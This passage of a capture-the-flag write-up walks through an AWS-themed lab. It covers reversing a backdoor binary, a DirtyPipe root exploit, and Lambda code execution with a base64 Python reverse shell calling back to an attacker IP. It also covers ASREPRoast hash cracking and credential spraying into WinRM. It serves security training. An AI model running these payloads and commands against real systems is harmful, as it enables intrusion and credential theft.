/usr/bin/su
/usr/bin/newgrp
/usr/bin/backup_tool
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
www-data@2415dc894201:~/web$ ls -l /usr/bin/backup_tool
ls -l /usr/bin/backup_tool
-rwsr-xr-x 1 root root 25040 Feb  9  2022 /usr/bin/backup_tool
www-data@2415dc894201:~/web$
```

Download this file `backup_tool`

The `username` and `password` fields use the weak `strcmp` function to compare the input with the result of the function so we can see the values with `ltrace`

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ ltrace ./backup_tool
setgid(0)= -1
setuid(0)                                                                                        = -1
puts("Enter your credentials to contin"...Enter your credentials to continue:
)                                                      = 36
printf("Username: ")                                                                             = 10
malloc(8)                                                                                        = 0x564f82f09dc0
__isoc99_scanf(0x564f5050c0cf, 0x564f5050e1e0, 0x726f6f646b636162, 6Username: test02
)                            = 1
printf("Password: ")                                                                             = 10
__isoc99_scanf(0x564f5050c0cf, 0x564f5050e260, 0, 0Password: test02
)                                             = 1
strcmp("test02", "backdoor")                                                                     = 18
puts("Incorrect Credentials!"Incorrect Credentials!
)                                                                   = 23
exit(1 <no return ...>
+++ exited (status 1) +++
```

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ ltrace ./backup_tool
setgid(0)= -1
setuid(0)                                                                                        = -1
puts("Enter your credentials to contin"...Enter your credentials to continue:
)                                                      = 36
printf("Username: ")                                                                             = 10
malloc(8)                                                                                        = 0x563b5ebccdc0
__isoc99_scanf(0x563b561230cf, 0x563b561251e0, 0x726f6f646b636162, 6Username: backdoor
)                            = 1
printf("Password: ")                                                                             = 10
__isoc99_scanf(0x563b561230cf, 0x563b56125260, 0, 0Password: test
)                                             = 1
strcmp("backdoor", "backdoor")                                                                   = 0
strcmp("test", "<!8,>;<;He")                                                                     = 56
puts("Incorrect Credentials!"Incorrect Credentials!
)                                                                   = 23
exit(1 <no return ...>
+++ exited (status 1) +++
```

The **otp** code depends on the time so it will be necessary to synchronize it with the `DC`, then in `gdb` we apply a breakpoint before the ret of the `g_o()` function that is used to obtain it, we run the program with the credentials and when it reaches the `breakpoint` the code will be saved in the `$rax` registry that we can see with `p`

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ sudo ntpdate -s amzcorp.local

┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ gdb -q backup_tool
Reading symbols from backup_tool...
(No debugging symbols found in backup_tool)
(gdb) break *g_o+805
Breakpoint 1 at 0x2642
(gdb) run
Starting program: /home/kali/Desktop/HTB/AWS-Fortresses/backup_tool
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter your credentials to continue:
Username: backdoor
Password: <!8,>;<;He

Breakpoint 1, 0x0000555555556642 in g_o ()
(gdb) print $rax
$1 = 344427
```

Depending on the time we can use it in the process or run the `binary` on the victim machine, we pass it the `credentials` and the `otp` code that we get

```
www-data@0474e1401baa:~$ /usr/bin/backup_tool
Enter your credentials to continue:
Username: backdoor
Password: <!8,>;<;He
OTP: 344427

Select Option:

1. Plant Backdoor
2. Read Secret
3. Restart exfiltration
4. Exit

Enter choice:
```

Going back to the code we realize the `options` that we unlock after authenticating, an interesting one is case `2` that calls the `function r_s()`, it opens the `/opt/flag.txt` file with fopen and prints it on the screen

```
__int64 l_m(){
  __int64 result; // rax
  unsigned int choice; // [rsp+Ch] [rbp-4h] BYREF

  do
  {
    puts("\nSelect Option:\n");
    puts("1. Plant Backdoor");
    puts("2. Read Secret");
    puts("3. Restart exfiltration");
    puts("4. Exit\n");
    printf("Enter choice: ");
    __isoc99_scanf("%1d", &choice);
    if ( choice == 4 )
    {
      printf("\x1B[1;1H\x1B[2J");
      exit(0);
    }
    if ( (int)choice <= 4 )
    {
      switch ( choice )
      {
        case 3u:
          s_b();
          goto LABEL_12;
        case 1u:
          a_b();
          goto LABEL_12;
        case 2u:
          r_s();
          goto LABEL_12;
      }
    }
    puts("Invalid choice!");
LABEL_12:
    result = choice;
  }
  while ( choice != 5 );
  return result;
}

__int64 r_s(){
  char secret[264]; // [rsp+0h] [rbp-110h] BYREF
  FILE *flag; // [rsp+108h] [rbp-8h]

  flag = fopen("/opt/flag.txt", "r");
  __isoc99_fscanf(flag, "%s", secret);
  printf("Secret: %s\n\n", secret);
  return 0LL;
}
```

On the machine we simply indicate case `2` and it shows us flag

```
Enter choice: 2
Secret: AWS{r3v3r51ng_1mpl4nt5_1s_fun}
```

---

### Shortcut (Flag 6)

Going back to the decompiled code we can see case `1` that calls the **function** `a_b()` which apparently modifies the `shadow` to add a hash of the user tom

```
__int64 a_b(){
  _DWORD entry[10]; // [rsp+0h] [rbp-160h] BYREF
  char command[8]; // [rsp+70h] [rbp-F0h] BYREF
  char dest[8]; // [rsp+E0h] [rbp-80h] BYREF
  char *src; // [rsp+148h] [rbp-18h]
  char *key; // [rsp+150h] [rbp-10h]
  char *salt; // [rsp+158h] [rbp-8h]

  puts("Initiating backdoor...");
  salt = "$6$52Cz9R5yJTSpDulz";
  key = g_u_p();
  src = crypt(key, "$6$52Cz9R5yJTSpDulz");
  *dest = 980250484LL;

  strcat(dest, src);
  *command = 0x27206F686365LL;

  strcat(command, dest);
  strcpy(entry, ":19027:0:99999:7:::' >> /etc/shadow");

  entry[9] = 0;
  strcat(command, entry);

  if ( s_s() )
  {
    puts("Already added to shadow");
  }
  else
  {
    system(command);
    puts("You may authenticate now");
  }
  return 0LL;
}
```

We go back to `gdb` and in addition to the breakpoint for the otp we add another one in `a_b()` after it calls `g_u_p()`, we get the otp code and send it, stopping at the second breakpoint in the log `$rax` we find a password

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ gdb -q ./backup_tool
Reading symbols from ./backup_tool...
(No debugging symbols found in ./backup_tool)
(gdb) break *g_o+805
Breakpoint 1 at 0x2642
(gdb) break *a_b+44
Breakpoint 2 at 0x19d5
(gdb) run
Starting program: /home/kali/Desktop/HTB/AWS-Fortresses/backup_tool
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter your credentials to continue:
Username: backdoor
Password: <!8,>;<;He

Breakpoint 1, 0x0000555555556642 in g_o ()
(gdb) print $rax
$1 = 142203
(gdb) continue
Continuing.
OTP: 142203

Select Option:

1. Plant Backdoor
2. Read Secret
3. Restart exfiltration
4. Exit

Enter choice: 1
Initiating backdoor...

Breakpoint 2, 0x00005555555559d5 in a_b ()
(gdb) x/s $rax
0x55555557c1c0: "dG9#r1@c0fR"
(gdb)
```

This obtained `password` can be used on the victim machine that we know is valid for the `tom` user and thus obtain a shell like this existing user

```
www-data@2415dc894201:/tmp$su tom
su tom
Password: dG9#r1@c0fR
id
uid=1000(tom) gid=1000(tom) groups=1000(tom)
python3 -c 'import pty;pty.spawn("/bin/bash")'
tom@2415dc894201:/tmp$id
id
uid=1000(tom) gid=1000(tom) groups=1000(tom)
tom@2415dc894201:/tmp$hostname -I
hostname -I
172.22.11.10
```

By running lines we can find possible ways to escalate privileges where the `DirtyPipe` exploit is recommended since it seems to be vulnerable

```
tom@1c89340fee5f:/tmp$ ./linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c
```

We can use an exploit of this CVE and when we execute it as requested, it modifies the `passwd` by removing the root password that is renamed `rootz`

**GitHub - Al1ex/CVE-2022-0847: CVE-2022-0847***CVE-2022-0847. Contribute to Al1ex/CVE-2022-0847 development by creating an account on GitHub.*github.com

```
tom@2415dc894201:/tmp$gcc exp.c -o exp
gcc exp.c -o exp
tom@2415dc894201:/tmp$cp /etc/passwd /tmp/passwd.bak
cp /etc/passwd /tmp/passwd.bak
tom@2415dc894201:/tmp$./exp /etc/passwd 1 ootz:
./exp /etc/passwd 1 ootz:
It worked!
tom@2415dc894201:/tmp$ head -n1 /etc/passwd
 head -n1 /etc/passwd
rootz::0:0:root:/root:/bin/bash
tom@2415dc894201:/tmp$su rootz
su rootz
rootz@2415dc894201:/tmp# id
id
uid=0(rootz) gid=0(root) groups=0(root)
rootz@2415dc894201:/tmp# cat /root/flag.txt
cat /root/flag.txt
AWS{uN1x1f13d_4_l0t!}
```

---

### Jerry-built (Flag 7)

In addition to `David's` Winrm credentials, `Olivia's` credentials are used to log in to the `workflow` subdomain that runs airflow behind

Update `etc/host`:

```
10.13.37.15 workflow.amzcorp.local
```

![](/blog/images/htb/1*BCfaG5ynLQ3UJdDpJa47sA.png)

Username: `olive`

Password: `dF4G0982#4%!`

![](/blog/images/htb/1*clpzCvFbk5FatD_WP0oW_g.png)

admin -> variables

![](/blog/images/htb/1*SfNtQ8hzFj8q2-YbeJA1rw.png)

Action -> export

![](/blog/images/htb/1*o_z5N1G8flQS709UbmHZiA.png)

This `json` file contains the 2 values we need for the aws credential

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ cat variables.json
{
    "AWS_ACCESS_KEY_ID": "AKIA5M34****RFFB",
    "AWS_SECRET_ACCESS_KEY": "cnVpO1/E****GOdn"
}
```

We configure `aws` by providing the keys, and using the endpoint of the `cloud` reserved subdomain we make an `sts` call to see the current user who is `will`

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws configure
AWS Access Key ID [****************QDFP]: AKIA5M34****RFFB
AWS Secret Access Key [****************0Rue]: cnVpO1/E****GOdn
Default region name [us-east-1]: au-east-1
Default output format [None]:
```

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws --endpoint-url http://cloud.amzcorp.local sts get-caller-identity | jq
{
  "UserId": "AKIAIOSF****3G29",
  "Account": "000000000000",
  "Arn": "arn:aws:iam::000000000000:user/will"
}
```

Going back to the `.yml` we can see that this user can create and invoke `lambda` functions using under the context of the `serviceadm` role for a period of time

```
 WillUser:
    Type: 'AWS::IAM::User'
    Properties:
      UserName: will
      Path: /
      Policies:
        - PolicyName: lambda-policy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - 'Lambda:CreateFunction'
                  - 'Lambda:InvokeFunction'
                  - 'IAM:PassRole'
                Resource: ['arn:aws:lambda:*:*:function:*','arn:aws:iam::*:role/serviceadm']
```

We start by creating a `rce.py` file with a `lambda_handler` function that will execute the `id` command, after that we create a `rce.zip` with it inside

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$cat rce.py
import os

def lambda_handler(event, context):
    return os.popen("id").read()

┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$zip rce.zip rce.py
  adding: rce.py (deflated 7%)
```

Now we create a `lambda` function that will run with `python3.8` using the `serviceadm` role `rce.lambda_handler` the file within `rce.zip` as a payload

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$aws --endpoint-url http://cloud.amzcorp.local lambda create-function --function-name id --runtime python3.8 --role "arn:aws:iam::000000000000:role/serviceadm" --handler rce.lambda_handler --zip-file fileb://rce.zip | jq
{
  "FunctionName": "id",
  "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:id",
  "Runtime": "python3.8",
  "Role": "arn:aws:iam::000000000000:role/serviceadm",
  "Handler": "rce.lambda_handler",
  "CodeSize": 238,
  "Description": "",
  "Timeout": 3,
  "LastModified": "2025-08-06T07:02:15.115+0000",
  "CodeSha256": "9zfVjShs2RDmRkPPiww7c1sjL6kj0MixI3P+aDKIERc=",
  "Version": "$LATEST",
  "VpcConfig": {},
  "TracingConfig": {
    "Mode": "PassThrough"
  },
  "RevisionId": "55c802a9-90d5-4033-8480-9cc9603b16d1",
  "State": "Active",
  "LastUpdateStatus": "Successful",
  "PackageType": "Zip"
}
```

We simply have to call this `function` and deposit the output in a `txt`, when we execute it in the txt we can see the executed `id` command reflected

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws --endpoint-url http://cloud.amzcorp.local lambda invoke --function-name id output.txt | jq
{
  "StatusCode": 200,
  "LogResult": "",
  "ExecutedVersion": "$LATEST"
}

┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ cat output.txt
"uid=993(sbx_user1051) gid=990 groups=990\n"
```

Already executing commands we could send us a shell however there is something more interesting and that is that when creating and invoking the function with the `serviceadm` role for a while we are admin on the entire `aws` service so we can list the functions

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws --endpoint-url http://cloud.amzcorp.local lambda list-functions | jq
{
  "Functions": [
    {
      "FunctionName": "tracking_api",
      "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:tracking_api",
      "Runtime": "python3.8",
      "Role": "arn:aws:iam::123456:role/irrelevant",
      "Handler": "code.lambda_handler",
      "CodeSize": 662,
      "Description": "",
      "Timeout": 3,
      "LastModified": "2023-09-18T04:18:59.017+0000",
      "CodeSha256": "HIkPHSeYh4DIQb5LaRF3ln8QjuajegZJsEyK8tCcxrU=",
      "Version": "$LATEST",
      "VpcConfig": {},
      "TracingConfig": {
        "Mode": "PassThrough"
      },
      "RevisionId": "5b7326f4-0090-403d-97ec-56101f1fdd69",
      "State": "Active",
      "LastUpdateStatus": "Successful",
      "PackageType": "Zip"
    },
    {
      "FunctionName": "shell",
      "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:shell",
      "Runtime": "python3.8",
      "Role": "arn:aws:iam::000000000000:role/serviceadm",
      "Handler": "rce.lambda_handler",
      "CodeSize": 472,
      "Description": "",
      "Timeout": 3,
      "LastModified": "2023-09-20T02:25:58.247+0000",
      "CodeSha256": "/mvu/HR9/kYGlcBkDeEhAGro67O0xK9X4/F75mn+uCg=",
      "Version": "$LATEST",
      "VpcConfig": {},
      "TracingConfig": {
        "Mode": "PassThrough"
      },
      "RevisionId": "f819e703-0e7d-4027-8d82-e96a8db0098f",
      "State": "Active",
      "LastUpdateStatus": "Successful",
      "PackageType": "Zip"
    }
  ]
}
```

In addition to the function we created we can see `tracking_api` quite similar, which also runs with `python3.8` and shows us the path of a `code.zip`

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws --endpoint-url http://cloud.amzcorp.local lambda get-function --function-name tracking_api | jq
{
  "Configuration": {
    "FunctionName": "tracking_api",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:tracking_api",
    "Runtime": "python3.8",
    "Role": "arn:aws:iam::123456:role/irrelevant",
    "Handler": "code.lambda_handler",
    "CodeSize": 662,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2025-08-03T06:08:30.510+0000",
    "CodeSha256": "HIkPHSeYh4DIQb5LaRF3ln8QjuajegZJsEyK8tCcxrU=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
      "Mode": "PassThrough"
    },
    "RevisionId": "ac2c6b4a-4278-48b0-8fab-bdf92615db89",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
  },
  "Code": {
    "Location": "http://172.22.192.2:4566/2015-03-31/functions/tracking_api/code"
  },
  "Tags": {}
}
```

We create a `json` file that in the id field that receives the function makes use of `builtins` to escape and execute a `base64` data that will send us a shell

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ cat payload.json
{
  "queryStringParameters": {
    "id": "1';a = [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings']0._module.__builtins__'__import__'.system('echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuOCIsNDQzKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIikn | base64 -d | bash'); b = 'a"
  }
}
```

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws --endpoint http://cloud.amzcorp.local lambda invoke --function-name tracking_api --payload fileb://payload.json output.txt | jq
{
  "StatusCode": 200
}
```

Finally, when we execute the function by passing the `payload.json` it executes our `base64` data and sends us a shell

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ sudo netcat -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.13.37.15] 49557
bash-4.2$ ls -l
ls -l
total 3
-rwxr-xr-x 1 sbx_user1051 990 594 Jan 12  2022 code.py
-rwxr-xr-x 1 sbx_user1051 990  37 Jan 17  2022 flag.txt
-rwxr-xr-x 1 sbx_user1051 990 662 Aug  3 06:08 original_lambda_archive.zip
drwxrwxrwx 1 sbx_user1051 990   0 Aug  6 08:23 __pycache__
bash-4.2$ cat flag.txt
cat flag.txt
AWS{i4m_w3ll_bu1lt_w1th0ut_bu1lt1ns}
bash-4.2$
```

---

### Line Up (Flag 8)

As administrators on the `aws` service we can list the queues under `sqs`, we find **sensor_updates** from which we can receive messages

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws --endpoint-url http://cloud.amzcorp.local sqs list-queues | jq
{
  "QueueUrls": [
    "http://localhost:4566/000000000000/sensor_updates"
  ]
}
```

Using `receive-message` we manage to receive messages under that `queue`, the first one shows us a `temperature` but when repeated several times it shows us the `flag`

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws --endpoint-url http://cloud.amzcorp.local sqs receive-message --queue-url http://cloud.amzcorp.local/000000000000/sensor_updates | jq
{
  "Messages": [
    {
      "MessageId": "2195d706-bb53-f3aa-d2a3-ddd83f81c4da",
      "ReceiptHandle": "zvyozyqrxfacrzsnobguwjhxhnlazgxazvuzeayhnlfrdfovtsmbauyeonpfdnmsttgzsjgyxggyxchfdcwiwbkghophrzwbomkacwslfxbdvyxslibgplkzqeosrxexxicjfhhniggjktrfniwcrssndrlyxtyqucabrkbxkneqdavhobzeomkno",
      "MD5OfBody": "7c9db777266f3ef48480f0e9773139a9",
      "Body": "Temperature: 24°c"
    }
  ]
}
```

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws --endpoint-url http://cloud.amzcorp.local sqs receive-message --queue-url http://cloud.amzcorp.local/000000000000/sensor_updates | jq
{
  "Messages": [
    {
      "MessageId": "56b56c7b-0e55-ffcf-47fd-446aa12861b5",
      "ReceiptHandle": "rnqrcrdcfhpdknpyhyttmjdcipbxkojhnhqcyeoyejsxpkvzjazidwhhebjaegbjxbdvfrotgmymtioyelmfvohvthrypstiauvytrdpizamhsmmqgrtydcvqjevqnotpzmitcjardeowhtmyjvcqfgfsgsdhsacznayezexwhpbdesserilnksku",
      "MD5OfBody": "724e0f5cb704edcfa5497ec156f713e6",
      "Body": "Faulty Reading. AWS{th4ts_4_l0ng_Q}"
    }
  ]
}
```

---

### Long Run (Flag 9)

Something curious is that the root user has an email in `/var/mail/root` where he is asked to activate the **user** `jameshauwnnel` as an account in the DC domain

```
rootz@2415dc894201:/tmp# cat /var/mail/root
From tom@localhost  Mon, 10 Jan 2022 09:10:48 GMT
Return-Path: <tom@localhost>
Received: from localhost (localhost [127.0.0.1])
 by localhost (8.15.2/8.15.2/Debian-18) with ESMTP id 28AAfaX452455
 for <root@localhost>; Mon, 10 Jan 2022 09:10:48 GMT
Received: (from tom@localhost)
 by localhost (8.15.2/8.15.2/Submit) id 28AAfaX452455;
 Mon, 10 Jan 2022 09:10:48 GMT
Date: Mon, 10 Jan 2022 09:10:48 GMT
Message-Id: <202201100910.28AAfaX452455@localhost>
To: root@localhost
From: tom@localhost
Subject: Activating User Account

Hi Tony.

Could you please activate the user account jameshauwnnel on the domain controller along with setting correct permissions for him.

Thanks,
Tom
```

We can validate the user with `kerbrute` and it is an existing account on the domain

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ kerbrute userenum -d amzcorp.local --dc dc01.amzcorp.local users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 08/05/25 - Ronnie Flathers @ropnop

2025/08/05 08:03:39 >  Using KDC(s):
2025/08/05 08:03:39 >   dc01.amzcorp.local:88

2025/08/05 08:03:40 >  [+] VALID USERNAME:       jameshauwnnel@amzcorp.local
2025/08/05 08:03:40 >  Done! Tested 1 usernames (1 valid) in 0.700 seconds
```

Something to try is an `ASREPRoast` where if a user has the `No Preauth` set we can get a TGT like this that translates to a kerberos hash format

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$impacket-GetNPUsers amzcorp.local/jameshauwnnel -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for jameshauwnnel
/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$jameshauwnnel@AMZCORP.LOCAL:e0c2d89448ad1ac6d0f90128f996d75a$bac7dbbd0d4187c2630223400a100311bc61b28810900caa2560d21e28b1bdf3a5917000b303b97e01899f37223cd597dc2abe557af704e1bd87e3ce5f1542ec606f971aeea129c51e45cfb7764361d1b70889b3d2f4fccf6d3b5e7849de2f8e41fb346c4b2c8df8c1f79c169d0278d0e96943cc509a4d37fb94219a010e3bd8432d656850fd6588cc62d17307d41a33e17f2fd56c32b152d11a07279dbf55420541fb210ff4552836ada50fcef87f70645470d89487e89c2480cacf884d508d8aaaa2d2739efc67d173c3167c285531a3a7578c7a1024de26adfb31cda49531d013863dc2c544526e58330561ba
```

At first `john` fails to break the hash with the `rockyou.txt` however by applying some `rules` we get the password `654221p!` for `jameshauwnnel`

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ john -w:/usr/share/wordlists/rockyou.txt hash --rules:d3ad0ne
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])
Press 'q' or Ctrl-C to abort, almost any other key for status
654221p!         ($krb5asrep$23$jameshauwnnel@AMZCORP.LOCAL)
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We check the credentials with `crackmapexec` and they are valid, listing the shares we see a `READ` privilege on `Product_Release`

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ crackmapexec smb amzcorp.local -u jameshauwnnel -p 654221p! --shares
SMB         dc01.amzcorp.local 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:amzcorp.local) (signing:True) (SMBv1:False)
SMB         dc01.amzcorp.local 445    DC01             [+] amzcorp.local\jameshauwnnel:654221p!
SMB         dc01.amzcorp.local 445    DC01             [+] Enumerated shares
SMB         dc01.amzcorp.local 445    DC01             Share           Permissions     Remark
SMB         dc01.amzcorp.local 445    DC01             -----           -----------     ------
SMB         dc01.amzcorp.local 445    DC01             ADMIN$                          Remote Admin
SMB         dc01.amzcorp.local 445    DC01             C$                              Default share
SMB         dc01.amzcorp.local 445    DC01             IPC$            READ            Remote IPC
SMB         dc01.amzcorp.local 445    DC01             NETLOGON        READ            Logon server share
SMB         dc01.amzcorp.local 445    DC01             Product_Release READ
SMB         dc01.amzcorp.local 445    DC01             SYSVOL          READ            Logon server share
```

We connected to the `resource Product_Release` using impacket's `smbclient` and found 2 files, we downloaded both, one seems to be a fragment type

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ impacket-smbclient amzcorp.local/jameshauwnnel:'654221p!'@dc01.amzcorp.local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# ls
[-] No share selected
# use Product_Release
# ls
drw-rw-rw-          0  Fri Jan 21 07:53:44 2022 .
drw-rw-rw-          0  Fri Jan 21 07:53:44 2022 ..
-rw-rw-rw-   18770248  Fri Jan 21 07:53:44 2022AMZ-V1.0.11.128_10.2.112.chk
-rw-rw-rw-        838  Fri Jan 21 07:53:44 2022AMZ-V1.0.11.128_10.2.112_Release_Notes.html
# mget *
[*] Downloading AMZ-V1.0.11.128_10.2.112.chk
[*] Downloading AMZ-V1.0.11.128_10.2.112_Release_Notes.html
#
```

Using `binwalk` we can extract files from the `.chk` and in one of the files we find possible `keys` to authenticate against the `AWS` service

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ binwalk -Me AMZ-V1.0.11.128_10.2.112.chk
```

```
strings _database.extracted/104EF | head
```

```
dynamodbz
http://cloud.amzcorp.local
AKIA5M37****QDFP
(HimNcdhu****0Rue)
endpoint_url
aws_access_key_id
aws_secret_access_keyc
d d d
username
HASH)
```

We configure `aws` by providing the keys, and using the `endpoint reserved subdomain` cloud we make an `sts` call to see the current user which is `john`

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws configure
AWS Access Key ID [None]: AKIA5M37****QDFP
AWS Secret Access Key [None]: HimNcdhu****0Rue
Default region name [None]: us-east-1
Default output format [None]:
```

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws --endpoint-url http://cloud.amzcorp.local sts get-caller-identity | jq
{
  "UserId": "AKIAC4G4****L0M2",
  "Account": "000000000000",
  "Arn": "arn:aws:iam::000000000000:user/john"
}
```

In the configuration file `.yml` in company-support we can see the privileges of the user `john`, he can dump the `users` table of the dynamodb with scan

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ curl -s http://company-support.amzcorp.local/static/uploads/CF_Prod_Template.yml | sed -n 133,146p
  JohnUser:
    Type: 'AWS::IAM::User'
    Properties:
      UserName: john
      Path: /
      Policies:
        - PolicyName: dynamodb-policy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - 'dynamodb:Scan'
                Resource: '*'

  DynamoDBTable:
    Type: 'AWS::DynamoDB::Table'
    Properties:
      TableName: Users
      AttributeDefinitions:
        - AttributeName: username
          AttributeType: S
        - AttributeName: password
          AttributeType: S
```

So with aws we can simply dump the `users` table of the dynamodb using scan where we find several possible `users` with their passwords

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws --endpoint-url http://cloud.amzcorp.local dynamodb scan --table-name users | jq
{
  "Items": [
    {
      "password": {
        "S": "dE2*5$fG"
      },
      "username": {
        "S": "jason"
      }
    },
    {
      "password": {
        "S": "cGh#@0_gJ"
      },
      "username": {
        "S": "david"
      }
    },
    {
      "password": {
        "S": "dF4G0982#4%!"
      },
      "username": {
        "S": "olivia"
      }
    }
  ],
  "Count": 3,
  "ScannedCount": 3,
  "ConsumedCapacity": null
}
```

We can create a user file and a password file

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws --endpoint-url http://cloud.amzcorp.local dynamodb scan --table-name users | jq -r '.Items[].username.S' > users.txt

┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws --endpoint-url http://cloud.amzcorp.local dynamodb scan --table-name users | jq -r '.Items[].password.S' > passwords.txt

┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ cat users.txt
jason
david
olivia

┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ cat passwords.txt
dE2*5$fG
cGh#@0_gJ
dF4G0982#4%!
```

We test each user with their respective password using `crackmapexec` and the `user David's` credentials are valid by authenticating to the domain

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ crackmapexec smb amzcorp.local -u users.txt -p passwords.txt --continue-on-success --no-bruteforce
SMB         dc01.amzcorp.local 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:amzcorp.local) (signing:True) (SMBv1:False)
SMB         dc01.amzcorp.local 445    DC01             [-] amzcorp.local\jason:dE2*5$fG STATUS_LOGON_FAILURE
SMB         dc01.amzcorp.local 445    DC01             [+] amzcorp.local\david:cGh#@0_gJ
SMB         dc01.amzcorp.local 445    DC01             [-] amzcorp.local\olivia:dF4G0982#4%! STATUS_LOGON_FAILURE
```

We simply connect using `evil-winrm` as the **user** `david`

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ evil-winrm -i amzcorp.local -u david -p cGh#@0_gJ

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\david\Documents> whoami
amzcorp\david
*Evil-WinRM* PS C:\Users\david\Documents> type ..\Desktop\flag.txt
AWS{h4ng_1n_th3r3_f0r_m0r3_cl0ud}
*Evil-WinRM* PS C:\Users\david\Documents>
```

